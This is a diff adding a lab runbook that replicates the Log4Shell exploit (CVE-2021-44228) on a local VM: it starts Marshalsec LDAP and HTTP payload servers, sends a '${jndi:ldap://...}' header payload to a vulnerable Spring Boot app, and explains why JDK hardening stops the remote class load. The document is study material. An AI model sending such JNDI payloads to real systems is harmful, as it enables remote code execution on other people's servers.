@@ -1,7 +1,206 @@
 # AIR-Project1-Task2
 Proof of Concept Replication of the Incident
 
-Perfect, this is the right moment to “flip the switch” and show **before/after** behaviour with a proper Log4j patch.
+## PoC Execution Runbook
+
+---
+
+### 1. Start attacker infrastructure
+
+All commands run inside the **Ubuntu ARM VM** as user `log4shell`.
+
+1. Change into the lab directory:
+
+   ```bash
+   sudo su - log4shell
+   cd /opt/log4shell
+   ```
+
+2. Start the **HTTP payload server** (serves `Exploit.class` on port 8000):
+
+   ```bash
+   ./run-http-server.sh
+   ```
+
+   * Verifies:
+
+     ```bash
+     curl -I http://127.0.0.1:8000/Exploit.class
+     tail -n 10 logs/http-server.log
+     ```
+   * Expected: `HTTP/1.0 200 OK` and a log entry like
+     `127.0.0.1 "HEAD /Exploit.class HTTP/1.1" 200 -`.
+
+3. Start the **LDAP / JNDI server** (Marshalsec, listening on port 1389):
+
+   ```bash
+   ./run-ldap-server.sh
+   ```
+
+   * Verifies:
+
+     ```bash
+     tail -n 10 logs/ldap-server.log
+     ```
+   * Expected:
+     `Listening on 0.0.0.0:1389`
+
+   The LDAP server is configured to return a reference to:
+
+   ```text
+   http://127.0.0.1:8000/Exploit.class
+   ```
+
+---
+
+### 2. Start the vulnerable application (victim)
+
+4. Start the **vulnerable Spring Boot application** using the native JAR (no Docker):
+
+   ```bash
+   ./run-vulnerable-app.sh
+   ```
+
+5. Verify that it is running on port 8080:
+
+   ```bash
+   curl -s -D- http://127.0.0.1:8080/ | head
+   ```
+
+   * Expected: HTTP response with `Hello, world!` in the body (status may be 200 or 400, both OK for the lab).
+
+6. Check the application log to confirm startup:
+
+   ```bash
+   tail -n 20 /opt/log4shell/vulnerable-app-native.log
+   ```
+
+   * Expected: Spring Boot / Tomcat startup messages, and on first request a line like:
+
+     ```text
+     HelloWorld : Received a request for API version Reference Class Name: foo
+     ```
+
+---
+
+### 3. Trigger the Log4Shell exploit
+
+7. Set the **JNDI payload** (copied from the PoC README, adjusted to this lab):
+
+   ```bash
+   cd /opt/log4shell
+   export JNDI_PAYLOAD='${jndi:ldap://127.0.0.1:1389/a}'
+   ```
+
+8. Send the HTTP request with the malicious `X-Api-Version` header:
+
+   ```bash
+   ./trigger-exploit.sh
+   ```
+
+   * Expected console output:
+
+     ```text
+     [*] Sending Log4Shell test payload to http://127.0.0.1:8080/ ...
+     Hello, world!
+     ```
+
+9. Confirm that the vulnerable application logged the header:
+
+   ```bash
+   tail -n 20 /opt/log4shell/vulnerable-app-native.log
+   ```
+
+   * Look for a log entry showing the `X-Api-Version` value being processed (either the raw `${jndi:...}` or the resolved “Reference Class Name” text).
+
+---
+
+### 4. Observe the attacker-side behaviour
+
+10. Check the **LDAP server log**:
+
+```bash
+tail -n 20 /opt/log4shell/logs/ldap-server.log
+```
+
+* Expected:
+
+  ```text
+  Listening on 0.0.0.0:1389
+  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
+  Send LDAP reference result for a redirecting to http://127.0.0.1:8000/Exploit.class
+  ```
+
+This shows that Log4j has performed a JNDI lookup to the attacker-controlled LDAP server, which responds with a reference to `Exploit.class` hosted on the HTTP server.
+
+11. Check the **HTTP server log**:
+
+```bash
+tail -n 20 /opt/log4shell/logs/http-server.log
+```
+
+* You will see entries for **manual tests** (e.g. your `curl -I` request), but **no entries triggered by the JVM** after sending the JNDI payload.
+
+This demonstrates that:
+
+* The application *is* performing the LDAP lookup,
+* But on **Java 11.0.28**, the JVM does **not** follow the remote `codebase` reference to fetch `Exploit.class`.
+
+---
+
+### 5. Payload behaviour and JDK hardening
+
+12. Inspect the payload source:
+
+```bash
+nano /opt/log4shell/CVE-2021-44228/exploit/Exploit.java
+```
+
+* The important line is:
+
+  ```java
+  Runtime.getRuntime().exec(command);
+  ```
+* In older JDKs, once `Exploit.class` is loaded this would execute a system command (for example, to create a marker file or run `id`).
+
+13. In this environment, verify that no payload effect is observed:
+
+```bash
+ls -l /tmp
+```
+
+* No new marker file appears after triggering the exploit.
+
+14. **Interpretation (for the report)**:
+
+* The PoC successfully demonstrates:
+
+  * Injection of a JNDI lookup into Log4j via an HTTP header.
+  * Outbound LDAP communication from the vulnerable application to attacker infrastructure.
+  * LDAP responses that instruct the JVM to load `Exploit.class` from an attacker-controlled HTTP server.
+* However, the application is running on **OpenJDK 11.0.28**, where remote JNDI `codebase` loading is disabled by default, so:
+
+  * The JVM does **not** request `/Exploit.class` from the HTTP server.
+  * `Exploit.class` is never loaded, and `Runtime.getRuntime().exec(...)` is not executed.
+
+This is a good example of how **JDK-level mitigations reduce exploitability**, even when the underlying Log4j version (2.14.1) is still in the vulnerable range.
+
+---
+
+### 6. Shutdown
+
+15. To cleanly stop the lab:
+
+```bash
+pkill -f "log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar" || true
+pkill -f "python3 -m http.server 8000" || true
+pkill -f "marshalsec.jndi.LDAPRefServer" || true
+```
+
+---
+
+
+Moment to “flip the switch” and show **before/after** behaviour with a proper Log4j patch.
 
 Below is a *drop-in runbook* you can follow on your current VM to:
 
